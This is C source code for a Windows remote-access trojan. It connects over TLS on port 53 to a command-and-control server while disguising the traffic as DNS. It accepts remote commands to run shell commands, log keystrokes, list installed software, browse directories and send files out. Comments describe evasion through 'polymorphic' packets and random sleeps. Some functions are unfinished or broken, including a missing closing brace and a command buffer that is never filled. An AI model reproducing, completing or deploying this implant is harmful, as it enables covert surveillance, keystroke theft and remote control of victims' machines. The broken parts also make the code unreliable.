#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <psapi.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define DNS_PORT 53  // DNS Port
#define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP

// Initialize Winsock
int initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    return 0;
}

// Initialize OpenSSL
SSL_CTX* initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    
    if (!ctx) {
        printf("Error initializing OpenSSL context.\n");
        return NULL;
    }
    return ctx;
}

// Clean up OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Randomized sleep
void random_sleep() {
    int sleep_time = (rand() % 600) * 1000;  // Random sleep up to 10 minutes
    Sleep(sleep_time);
}

// Function to create a DNS-like query with obfuscation
void create_disguised_dns_query(char* buffer, const char* host) {
    // Polymorphic mutation of the packet header
    buffer[0] = rand() % 256;  // Random transaction ID
    buffer[1] = rand() % 256;  // Random transaction ID
    buffer[2] = 0x01;          // Recursion desired
    buffer[3] = 0x00;          // Randomize flags for polymorphic behavior

    // Question count
    buffer[4] = 0x00;
    buffer[5] = 0x01;  // 1 question

    // Answer, Authority, and Additional Record Count
    buffer[6] = 0x00;
    buffer[7] = 0x00; // 0 answers
    buffer[8] = 0x00;
    buffer[9] = 0x00; // 0 authority records
    buffer[10] = 0x00;
    buffer[11] = 0x00; // 0 additional records

    // Question section (DNS query for "example.com")
    int i = 12;  // Start after header
    sprintf(&buffer[i], "%s", host);
    i += strlen(host);

    // Add random data for obfuscation
    for (int j = 0; j < 16; j++) {
        buffer[i++] = rand() % 256;  // Random gibberish data
    }
    buffer[i] = '\0';  // Null-terminate
}

// Establish connection to C2 server using SSL
SSL* connect_to_c2(SSL_CTX* ctx) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DNS_PORT);  // Using DNS port 53 for C2
    inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Failed to create socket.\n");
        return NULL;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Failed to connect to C2 server.\n");
        closesocket(sock);
        return NULL;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        printf("SSL handshake failed.\n");
        SSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    printf("Connected to C2 server on port 53 (DNS disguise).\n");
    return ssl;
}

// Send disguised data to C2 server
void send_disguised_data(SSL* ssl) {
    char dns_query[BUFFER_SIZE];
    create_disguised_dns_query(dns_query, "example.com");

    if (SSL_write(ssl, dns_query, strlen(dns_query)) <= 0) {
        printf("Failed to send data to C2.\n");
    } else {
        printf("Disguised DNS query sent to C2 server.\n");
    }
}

// Receive response from C2 server
void receive_data_from_c2(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("Received data from C2 server: %s\n", buffer);
    } else {
        printf("No data received from C2 server.\n");
    }
}

// Change Directory (cd)
void change_directory(SSL* ssl, const char* path) {
    if (SetCurrentDirectory(path)) {
        send_disguised_data(ssl);
    } else {
        send_disguised_data(ssl);
    }
}

// Get current working directory (pwd)
void get_current_directory(SSL* ssl) {
    char cwd[BUFFER_SIZE];
    if (GetCurrentDirectory(BUFFER_SIZE, cwd)) {
        send_disguised_data(ssl);
    } else {
        send_disguised_data(ssl);
    }
}

// List installed applications
void list_installed_applications(SSL* ssl) {
    HKEY hUninstallKey = NULL;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hUninstallKey) != ERROR_SUCCESS) {
        send_disguised_data(ssl);
        return;
    }
    
    DWORD index = 0;
    char appName[BUFFER_SIZE];
    while (RegEnumKeyEx(hUninstallKey, index, appName, &(DWORD){BUFFER_SIZE}, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        send_disguised_data(ssl);
        index++;
    }
    RegCloseKey(hUninstallKey);
}

// Capture keystrokes for X time
void capture_keystrokes(SSL* ssl, int duration_seconds) {
    char keystrokes[BUFFER_SIZE] = "";
    DWORD startTime = GetTickCount();
    
    while ((GetTickCount() - startTime) / 1000 < duration_seconds) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                char keychar = (char)key;
                strncat(keystrokes, &keychar, 1);
            }
        }
        Sleep(10);  // Avoid busy-looping too much
    }
    
    send_disguised_data(ssl);
}

// Run cmd command and send output to C2
void run_cmd_command(SSL* ssl, const char* command) {
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(command, "r");
    if (!pipe) {
        send_disguised_data(ssl);
        return;
    }
    while (fgets(buffer, BUFFER_SIZE, pipe) != NULL) {
        send_disguised_data(ssl);
    }
    _pclose(pipe);
}

// Function to transfer a file to C2 server
void transfer_file_to_c2(SSL* ssl, const char* filepath) {
    FILE* file = fopen(filepath, "rb");
    if (!file) {
        printf("Failed to open file for transfer: %s\n", filepath);
        send_disguised_data(ssl);  // Send error message
        return;
    }

    char buffer[BUFFER_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        if (SSL_write(ssl, buffer, bytes_read) <= 0) {
            printf("Failed to send file data.\n");
            break;
        }
    }

// Main loop that communicates with the C2 server while performing random actions
void main_loop(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    while (1) {
        receive_data_from_c2(ssl);
        if (strncmp(buffer, "CD ", 3) == 0) {
            change_directory(ssl, buffer + 3);
        } else if (strcmp(buffer, "PWD") == 0) {
            get_current_directory(ssl);
        } else if (strcmp(buffer, "LIST_APPS") == 0) {
            list_installed_applications(ssl);
        } else if (strncmp(buffer, "KEYLOG", 6) == 0) {
            int duration = atoi(buffer + 7);  // Parse the duration for keylogging
            capture_keystrokes(ssl, duration);
        } else if (strncmp(buffer, "CMD ", 4) == 0) {
            run_cmd_command(ssl, buffer + 4);  // Execute command
        } else if (strncmp(buffer, "TRANSFER ", 9) == 0) {  // <<< ADD THIS HERE
            transfer_file_to_c2(ssl, buffer + 9);  // Transfer specified file
        } else {
            printf("Unknown command received: %s\n", buffer);
        }
        
        random_sleep();
    }
}

int main() {
    srand(time(NULL));  // Seed random number generator

    // Initialize Winsock
    if (initialize_winsock() != 0) {
        return 1;
    }

    // Initialize OpenSSL
    SSL_CTX* ctx = initialize_openssl();
    if (!ctx) {
        WSACleanup();
        return 1;
    }

    // Connect to C2 server disguised as DNS traffic
    SSL* ssl = connect_to_c2(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }

    // Main loop: receive and execute commands from C2 server
    main_loop(ssl);

    // Clean up
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    WSACleanup();
    return 0;
}
